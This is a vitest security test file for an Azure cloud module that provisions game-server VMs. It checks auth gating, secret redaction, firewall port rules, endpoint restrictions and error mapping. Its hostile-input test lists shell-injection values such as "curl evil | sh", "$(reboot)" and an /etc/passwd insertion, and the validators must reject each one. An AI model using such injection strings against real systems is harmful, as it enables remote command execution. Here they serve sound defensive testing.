import { afterEach, describe, expect, it } from 'vitest';
import { estimateAzureCost, type AzureRegion } from '@hz/shared';
import {
  AZURE_LOGIN,
  AZURE_MANAGEMENT,
  AZURE_PRICES,
  AzureClient,
  azureEndpoints,
  azureErrorFor,
  nsgRules,
  throwawaySshPublicKey,
  vmBody,
} from '../src/cloud/azure.js';
import { CloudInitError, renderCloudInit, shQuote } from '../src/cloud/cloud-init.js';
import { splitByMonth } from '../src/cloud/service.js';
import { loadConfig } from '../src/config.js';
import { withStepUp } from './agent-helpers.js';
import {
  B2MS_RUNNING,
  cloudTick,
  FAKE_AZURE_CLIENT,
  FAKE_AZURE_SECRET,
  FAKE_AZURE_SUBSCRIPTION,
  FAKE_AZURE_TENANT,
  FAKE_TAILSCALE_KEY,
  FakeAzure,
  machineOf,
  order,
  orderBody,
  orderedWithGame,
  req,
  setAccount,
  untilState,
  withCloud,
  type CloudSetup,
  type SimAgent,
} from './cloud-helpers.js';
import { FAKE_PRICES } from '../../../e2e/helpers/fake-azure.js';
import { REPO_TEMPLATES } from './games-helpers.js';
import { KEY, makeApp, SAME_ORIGIN, completeSetup, type TestApp } from './helpers.js';

let s: CloudSetup | null = null;
let other: TestApp | null = null;
let agents: SimAgent[] = [];

afterEach(async () => {
  for (const a of agents) await a.disconnect();
  agents = [];
  await s?.t.app.close();
  await other?.app.close();
  s = null;
  other = null;
});

const OTHER_GUID = '12345678-1234-1234-1234-123456789abc';
const FIXED = new Set([AZURE_LOGIN, AZURE_MANAGEMENT, AZURE_PRICES]);

/** Concrete URL of a route pattern (`:id` -> a valid id). */
function concrete(url: string): string {
  return url.replace(/:id\b/g, 'abcdefgh1234');
}

function cloudRoutes(t: TestApp): { method: string; url: string }[] {
  return t.app.hzRoutes.filter(
    (r) => (r.url === '/api/cloud' || r.url.startsWith('/api/cloud/')) && r.method !== 'HEAD',
  );
}

describe('cloud security (M22)', { timeout: 60_000 }, () => {
  it('module off: every /api/cloud route answers 404 module_disabled; no session: 401', async () => {
    other = await makeApp({ modules: { cloud: false } });
    const admin = await completeSetup(other);
    const routes = cloudRoutes(other);
    expect(routes.length).toBeGreaterThanOrEqual(10);
    for (const r of routes) {
      const res = await other.app.inject({
        method: r.method as 'GET',
        url: concrete(r.url),
        headers: { ...SAME_ORIGIN, cookie: `hz_session=${admin.cookie}` },
        ...(r.method === 'GET' ? {} : { payload: {} }),
      });
      expect(res.statusCode, `${r.method} ${r.url}`).toBe(404);
      expect(res.json()).toEqual({ ok: false, error: 'module_disabled' });
    }
    const on = await withCloud({ account: false });
    s = on;
    for (const r of cloudRoutes(on.t)) {
      const res = await on.t.app.inject({
        method: r.method as 'GET',
        url: concrete(r.url),
        headers: SAME_ORIGIN,
        ...(r.method === 'GET' ? {} : { payload: {} }),
      });
      expect(res.statusCode, `${r.method} ${r.url}`).toBe(401);
    }
  });

  it('step-up for account fields except region and budget, and for deleting the account', async () => {
    const c = (s = await withCloud({ account: false }));
    const cred = await req(c, 'PUT', '/api/cloud/azure', { tenantId: FAKE_AZURE_TENANT });
    expect(cred.json()).toEqual({ ok: false, error: 'step_up_required' });
    const key = await req(c, 'PUT', '/api/cloud/azure', { tailscaleAuthKey: FAKE_TAILSCALE_KEY });
    expect(key.statusCode).toBe(403);
    const budget = await req(c, 'PUT', '/api/cloud/azure', {
      budgetEurPerMonth: 30,
      region: 'westeurope',
    });
    expect(budget.statusCode).toBe(200);
    expect(budget.json()).toMatchObject({
      budgetEurPerMonth: 30,
      region: 'westeurope',
      status: 'off',
    });
    expect((await req(c, 'PUT', '/api/cloud/azure', { resourceGroup: 'a/../b' })).statusCode).toBe(
      400,
    );
    expect((await req(c, 'PUT', '/api/cloud/azure', { tenantId: 'not-a-guid' })).statusCode).toBe(
      400,
    );
    expect((await req(c, 'DELETE', '/api/cloud/azure')).statusCode).toBe(403);
    await setAccount(c);
    await order(c, { game: undefined });
    const busy = await withStepUp(c.t, () => req(c, 'DELETE', '/api/cloud/azure'));
    expect(busy.statusCode).toBe(409);
    // Switching subscription/tenant/group with machines would orphan them.
    const sw = await withStepUp(c.t, () =>
      req(c, 'PUT', '/api/cloud/azure', { subscriptionId: OTHER_GUID }),
    );
    expect(sw.statusCode).toBe(409);
  });

  it('the secret is dropped when tenant, app or subscription change without a new one', async () => {
    const c = (s = await withCloud());
    const put = (body: Record<string, unknown>) =>
      withStepUp(c.t, () => req(c, 'PUT', '/api/cloud/azure', body));
    for (const field of ['tenantId', 'clientId', 'subscriptionId'] as const) {
      await setAccount(c);
      expect((await req(c, 'GET', '/api/cloud/azure')).json()).toMatchObject({ secretSet: true });
      const res = await put({ [field]: OTHER_GUID });
      expect(res.statusCode).toBe(200);
      expect(res.json()).toMatchObject({ secretSet: false, status: 'off', [field]: OTHER_GUID });
      const audit = c.t.db.sqlite
        .prepare(
          "SELECT details_json AS d FROM audit_log WHERE action = 'cloud.settings_updated' ORDER BY id DESC",
        )
        .get() as { d: string };
      expect(JSON.parse(audit.d)).toEqual({ fields: [field], secretDropped: true });
    }
    await setAccount(c);
    // Same value again, the group, or a new secret along: the secret stays.
    expect((await put({ tenantId: FAKE_AZURE_TENANT })).json()).toMatchObject({ secretSet: true });
    expect((await put({ resourceGroup: 'andere-gruppe' })).json()).toMatchObject({
      secretSet: true,
    });
    const both = await put({
      clientId: OTHER_GUID,
      clientSecret: ['new', 'app', 'value', '0123456789'].join('-'),
    });
    expect(both.json()).toMatchObject({ secretSet: true, clientId: OTHER_GUID });
  });

  it('secrets never reach a response, a log line, the audit log, an alert or an error', async () => {
    const c = (s = await withCloud({ captureLogs: true }));
    const bodies: string[] = [];
    const { machine, agent, gameId } = await orderedWithGame(c);
    agents.push(agent);
    for (const url of [
      '/api/cloud',
      '/api/cloud/azure',
      '/api/cloud/azure/prices',
      `/api/games/${gameId}`,
    ]) {
      bodies.push((await req(c, 'GET', url)).body);
    }
    bodies.push((await req(c, 'POST', '/api/cloud/azure/test')).body);
    bodies.push((await req(c, 'POST', `/api/cloud/machines/${machine.id}/stop`)).body);
    bodies.push(
      (await req(c, 'POST', '/api/cloud/machines', orderBody({ confirmEurPerHour: 1 }))).body,
    );
    // A wrong secret: Azure answers with an AADSTS text; the core says "Zugangsdaten ungültig".
    c.azure.clientSecret = ['some', 'thing', 'else', 'entirely'].join('-');
    c.azure.override = (r) =>
      r.path.includes('/networkSecurityGroups/')
        ? { status: 500, body: { error: { code: 'X', message: FAKE_AZURE_SECRET } } }
        : null;
    const test = await req(c, 'POST', '/api/cloud/azure/test');
    bodies.push(test.body);
    expect(test.json()).toMatchObject({ status: 'error', error: 'Zugangsdaten ungültig' });
    await cloudTick(c, 5_000, agent);
    bodies.push((await req(c, 'GET', '/api/cloud')).body);

    const code = /sh -s -- (\S+)/.exec(c.azure.cloudInit(machine.name) ?? '')?.[1] ?? 'none';
    const customData = (
      c.azure.vm(machine.name) as { properties: { osProfile: { customData: string } } }
    ).properties.osProfile.customData;
    const tokens = c.azure.requests
      .map((r) => r.headers.authorization ?? '')
      .filter((a) => a.startsWith('Bearer '))
      .map((a) => a.slice(7));
    expect(tokens.length).toBeGreaterThan(0);
    const secrets = [
      FAKE_AZURE_SECRET,
      FAKE_TAILSCALE_KEY,
      code,
      code.replace('-', ''),
      customData.slice(0, 40),
      ...new Set(tokens),
    ];
    const db = c.t.db.sqlite;
    const audit = JSON.stringify(db.prepare('SELECT * FROM audit_log').all());
    const alerts = JSON.stringify(db.prepare('SELECT * FROM alerts').all());
    const settingsRows = JSON.stringify(
      db.prepare("SELECT * FROM settings WHERE key LIKE 'cloud.%'").all(),
    );
    const machines = JSON.stringify(db.prepare('SELECT * FROM cloud_machines').all());
    const logs = c.t.logs.join('\n');
    expect(logs.length).toBeGreaterThan(0);
    for (const secret of secrets) {
      for (const [where, text] of Object.entries({
        logs,
        audit,
        alerts,
        settingsRows,
        machines,
        bodies: bodies.join('\n'),
      })) {
        expect(text.includes(secret), `${where} contains a secret`).toBe(false);
      }
    }
  });

  it('a secret game field of the pending game is stored encrypted; NSG: game ports only, never RCON or local ports', async () => {
    const c = (s = await withCloud({ env: { HZ_GAME_TEMPLATES_DIR: REPO_TEMPLATES } }));
    const pw = ['Pal', 'world', 'Pass', '42'].join('-');
    const cost = estimateAzureCost({
      computeEurPerHour: FAKE_PRICES.Standard_B4ms ?? 0,
      diskType: 'StandardSSD_LRS',
      diskGb: 32,
      publicIp: true,
      source: 'live',
    });
    const game = {
      templateId: 'palworld',
      name: 'pal',
      values: { MEMORY: '8G', SERVER_PASSWORD: pw },
    };
    const { machine, agent } = await orderedWithGame(c, {
      name: 'hz-pal',
      size: 'Standard_B4ms',
      confirmEurPerHour: cost.runningEurPerHour,
      game,
    });
    agents.push(agent);
    expect(machine.gameIds).toHaveLength(1);
    expect(c.azure.nsgPorts('hz-pal')).toEqual(['udp/8211']);
    const nsg = JSON.stringify(
      c.azure.resource('Microsoft.Network/networkSecurityGroups', 'hz-pal-nsg')?.body,
    );
    for (const p of ['"22"', '"25575"', '"8212"']) expect(nsg).not.toContain(p);
    const second = await order(c, {
      name: 'hz-pal2',
      size: 'Standard_B4ms',
      confirmEurPerHour: cost.runningEurPerHour,
      game: { ...game, name: 'pal2' },
    });
    const raw = c.t.db.sqlite
      .prepare('SELECT pending_game_json AS p FROM cloud_machines WHERE id = ?')
      .get(second.id) as { p: string };
    expect(raw.p).toMatch(/^v1:/);
    expect(raw.p).not.toContain(pw);
    expect(
      nsgRules([
        { proto: 'tcp', port: 22 },
        { proto: 'udp', port: 0 },
        { proto: 'tcp', port: 70000 },
        { proto: 'tcp', port: 25565 },
        { proto: 'tcp', port: 25565 },
      ]),
    ).toEqual([{ proto: 'tcp', port: 25565 }]);
  });

  it('the VM has no password, an SSH key without its private part, and cloud-init in customData', async () => {
    const c = (s = await withCloud());
    const m = await order(c, { game: undefined });
    await untilState(c, m.id, 'installing');
    const vm = JSON.stringify(c.azure.vm('hz-mc'));
    expect(vm).toContain('"disablePasswordAuthentication":true');
    expect(vm.toLowerCase()).not.toContain('password"');
    expect(vm).not.toContain('PRIVATE');
    expect(vm).toMatch(/"keyData":"ssh-rsa [A-Za-z0-9+/=]+ hz-throwaway"/);
    expect(vm).toContain(
      '"publisher":"Canonical","offer":"ubuntu-24_04-lts","sku":"server","version":"latest"',
    );
    expect(vm).toContain('"name":"hz-mc-disk"');
    expect(throwawaySshPublicKey()).not.toBe(throwawaySshPublicKey());
    // Only the fixed hosts, every ARM request with a bearer token, never the secret in a URL.
    for (const r of c.azure.requests) {
      expect(FIXED.has(r.origin), r.origin).toBe(true);
      expect(r.path + r.query).not.toContain(FAKE_AZURE_SECRET);
      if (r.origin === AZURE_MANAGEMENT) expect(r.headers.authorization).toMatch(/^Bearer /);
    }
    // One token for all of it (cached until 5 min before expiry).
    expect(c.azure.requests.filter((r) => r.origin === AZURE_LOGIN)).toHaveLength(1);
    await withStepUp(c.t, () =>
      req(c, 'PUT', '/api/cloud/azure', { clientSecret: FAKE_AZURE_SECRET }),
    );
    await cloudTick(c);
    await req(c, 'POST', '/api/cloud/azure/test');
    expect(c.azure.requests.filter((r) => r.origin === AZURE_LOGIN).length).toBeGreaterThan(1);
    expect(machineOf(c, m.id).cost.runningEurPerHour).toBe(B2MS_RUNNING);
  });

  it('endpoint overrides only with HZ_DEMO=1 and only http://127.0.0.1:<port>', () => {
    const cfg = (env: Record<string, string>) =>
      azureEndpoints(loadConfig({ HZ_SECRET_KEY: KEY, NODE_ENV: 'test', ...env }));
    const fixed = { login: AZURE_LOGIN, management: AZURE_MANAGEMENT, prices: AZURE_PRICES };
    const local = 'http://127.0.0.1:8098';
    expect(cfg({})).toEqual(fixed);
    expect(
      cfg({
        HZ_AZURE_LOGIN_URL: local,
        HZ_AZURE_MANAGEMENT_URL: local,
        HZ_AZURE_PRICES_URL: local,
      }),
    ).toEqual(fixed);
    for (const bad of [
      'http://localhost:8098',
      'https://127.0.0.1:8098',
      'http://127.0.0.1:8098/x',
      'http://127.0.0.2:8098',
      'http://127.0.0.1',
      'http://127.0.0.1:0',
      'http://evil.example:80',
      'http://user@127.0.0.1:80',
    ]) {
      expect(cfg({ HZ_DEMO: '1', HZ_AZURE_MANAGEMENT_URL: bad }).management, bad).toBe(
        AZURE_MANAGEMENT,
      );
    }
    expect(
      cfg({
        HZ_DEMO: '1',
        HZ_AZURE_LOGIN_URL: local,
        HZ_AZURE_MANAGEMENT_URL: local,
        HZ_AZURE_PRICES_URL: local,
      }),
    ).toEqual({ login: local, management: local, prices: local });
  });

  it('path parts and cloud-init values: hostile input cannot get in', async () => {
    const az = new FakeAzure();
    const client = new AzureClient({
      fetch: az.fetch,
      endpoints: { login: AZURE_LOGIN, management: AZURE_MANAGEMENT, prices: AZURE_PRICES },
      now: () => 0,
    });
    const creds = {
      tenantId: FAKE_AZURE_TENANT,
      clientId: FAKE_AZURE_CLIENT,
      clientSecret: FAKE_AZURE_SECRET,
      subscriptionId: FAKE_AZURE_SUBSCRIPTION,
      resourceGroup: 'hz-cloud',
    };
    const region = 'germanywestcentral' as AzureRegion;
    for (const name of ['../x', 'a/b', 'hz-mc?x=1', 'HZ', 'hz mc', "hz'mc", 'hz-mc%2f']) {
      expect(() => client.resourceId(creds, 'vm', name, region), name).toThrow();
    }
    expect(() => client.resourceId(creds, 'vm', 'hz-mc', 'evil' as AzureRegion)).toThrow();
    await expect(client.testAccess({ ...creds, resourceGroup: '../../x' })).rejects.toThrow();
    await expect(client.testAccess({ ...creds, tenantId: '../common' })).rejects.toThrow();
    expect(az.requests).toHaveLength(0);
    expect(client.resourceId(creds, 'nic', 'hz-mc', region)).toBe(
      `/subscriptions/${FAKE_AZURE_SUBSCRIPTION}/resourceGroups/hz-cloud/providers/Microsoft.Network/networkInterfaces/hz-mc-nic`,
    );

    const ok = {
      name: 'hz-mc',
      tailscaleAuthKey: FAKE_TAILSCALE_KEY,
      hubOrigin: 'https://hz.example.ts.net',
      code: 'ABCD-EFGH',
    };
    expect(renderCloudInit(ok)).toContain("--hostname='hz-mc'");
    const hostile: [keyof typeof ok, string][] = [
      ['name', "hz-mc'; curl evil | sh; '"],
      ['name', 'hz-mc\nruncmd: [reboot]'],
      ['name', '$(reboot)'],
      ['tailscaleAuthKey', `${FAKE_TAILSCALE_KEY}' && reboot #`],
      ['tailscaleAuthKey', `${FAKE_TAILSCALE_KEY}\n  - path: /etc/passwd`],
      ['tailscaleAuthKey', 'tskey-auth-$(reboot)'],
      ['code', 'ABCD-EFGH; reboot'],
      ['code', 'abcd-efgh'],
      ['hubOrigin', "https://hz.example.ts.net'; reboot; '"],
      ['hubOrigin', 'https://hz.example.ts.net/path'],
      ['hubOrigin', 'http://evil.example'],
      ['hubOrigin', 'https://user:pw@hz.example.ts.net'],
    ];
    for (const [field, value] of hostile) {
      expect(() => renderCloudInit({ ...ok, [field]: value }), `${field}=${value}`).toThrow(
        CloudInitError,
      );
    }
    expect(() => shQuote("a'b", 'name')).toThrow(CloudInitError);
    expect(() => shQuote('a b', 'name')).toThrow(CloudInitError);
    expect(() =>
      vmBody(
        {
          name: 'hz-mc',
          region,
          size: 'Standard_B2ms',
          diskType: 'StandardSSD_LRS',
          diskGb: 32,
          publicIp: true,
          customData: 'not base64!',
        },
        'x',
      ),
    ).toThrow();

    // Through the API: hostile names stop at the schema.
    const c = (s = await withCloud());
    for (const name of ["hz'; reboot", '../hz', 'HZ-MC', 'a', `hz-${'x'.repeat(40)}`]) {
      expect(
        (await req(c, 'POST', '/api/cloud/machines', orderBody({ name }))).statusCode,
        name,
      ).toBe(400);
    }
    expect(
      (await req(c, 'POST', '/api/cloud/machines', orderBody({ size: 'Standard_M128' })))
        .statusCode,
    ).toBe(400);
    expect(
      (await req(c, 'POST', '/api/cloud/machines', orderBody({ region: 'eastus' }))).statusCode,
    ).toBe(400);
    expect((await req(c, 'POST', '/api/cloud/machines/..%2f..%2fx/start')).statusCode).toBe(400);
  });

  it('Azure failures map to fixed texts, never the remote body', () => {
    const cases: [number, unknown, string][] = [
      [401, { error: { code: 'InvalidAuthenticationToken' } }, 'Zugangsdaten ungültig'],
      [
        400,
        { error: 'invalid_client', error_description: 'AADSTS7000215' },
        'Zugangsdaten ungültig',
      ],
      [
        403,
        { error: { code: 'AuthorizationFailed' } },
        'Keine Berechtigung in der Ressourcengruppe',
      ],
      [404, { error: { code: 'ResourceGroupNotFound' } }, 'Ressourcengruppe nicht gefunden'],
      [409, { error: { code: 'SkuNotAvailable' } }, 'Größe in der Region nicht verfügbar'],
      [409, { error: { code: 'QuotaExceeded' } }, 'Kontingent der Region erschöpft'],
      [409, { error: { code: 'OperationNotAllowed' } }, 'Kontingent der Region erschöpft'],
      [503, {}, 'Azure nicht erreichbar'],
      [418, 'not json', 'Unerwartete Antwort von Azure'],
    ];
    for (const [status, body, text] of cases) {
      const e = azureErrorFor(status, typeof body === 'string' ? body : JSON.stringify(body));
      expect(e.text, `${status}`).toBe(text);
      expect(e.message).toBe(text);
    }
  });

  it('no redirects, timeouts and oversized answers are errors', async () => {
    const mk = (fetch: (u: string, i: RequestInit) => Promise<Response>) =>
      new AzureClient({
        fetch,
        endpoints: { login: AZURE_LOGIN, management: AZURE_MANAGEMENT, prices: AZURE_PRICES },
        now: () => 0,
        timeoutMs: 50,
      });
    const seen: RequestInit[] = [];
    const redirect = mk(async (_u, i) => {
      seen.push(i);
      return new Response(null, { status: 302, headers: { location: 'https://evil.example/' } });
    });
    await expect(redirect.retailPrices('westeurope')).rejects.toMatchObject({
      text: 'Unerwartete Antwort von Azure',
    });
    expect(seen[0]?.redirect).toBe('manual');
    const slow = mk(
      (_u, i) =>
        new Promise((_r, reject) => {
          i.signal?.addEventListener('abort', () => reject(i.signal?.reason));
        }),
    );
    await expect(slow.retailPrices('westeurope')).rejects.toMatchObject({
      text: 'Zeitüberschreitung',
    });
    const big = mk(async () => new Response('x'.repeat(3 * 1024 * 1024), { status: 200 }));
    await expect(big.retailPrices('westeurope')).rejects.toMatchObject({
      text: 'Unerwartete Antwort von Azure',
    });
    const down = mk(async () => {
      throw new Error('ECONNREFUSED with secret details');
    });
    await expect(down.retailPrices('westeurope')).rejects.toMatchObject({
      text: 'Azure nicht erreichbar',
    });
  });

  it('usage is split by calendar month in HZ_TIMEZONE without drift', () => {
    // 31.10.2026 23:30 Vienna (CET after the DST switch) -> 1.11. 00:30.
    const from = Date.UTC(2026, 9, 31, 22, 30);
    expect(splitByMonth(from, from + 3_600_000)).toEqual([
      { month: '2026-10', seconds: 1800 },
      { month: '2026-11', seconds: 1800 },
    ]);
    let total = 0;
    for (let t = 0; t < 100; t++) {
      const a = 1_000_000_123 + t * 4_999;
      total += splitByMonth(a, a + 4_999).reduce((x, p) => x + p.seconds, 0);
    }
    expect(total).toBe(
      Math.floor((1_000_000_123 + 100 * 4_999) / 1000) - Math.floor(1_000_000_123 / 1000),
    );
  });
});
